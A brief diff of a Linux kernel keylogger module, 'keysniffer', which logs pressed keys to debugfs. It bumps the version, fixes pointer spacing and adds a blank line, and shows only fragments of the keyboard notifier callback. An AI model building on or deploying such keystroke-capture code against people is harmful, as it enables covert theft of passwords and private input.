@@ -28,7 +28,7 @@
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
-MODULE_VERSION("1.2");
+MODULE_VERSION("1.4");
 MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");
 
 /* Declarations */
@@ -109,7 +109,7 @@ int keysniffer_cb(struct notifier_block *nblock,
 {
 	size_t len;
 	struct keyboard_notifier_param *param = _param;
-	const char * pressed_key;
+	const char *pressed_key;
 
 	/* pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
 		code, param->down, param->shift, param->value); */
@@ -136,6 +136,7 @@ int keysniffer_cb(struct notifier_block *nblock,
 			/* pr_debug("%s\n", pressed_key; */
 		}
 	}
+
 	return NOTIFY_OK;
 }
 
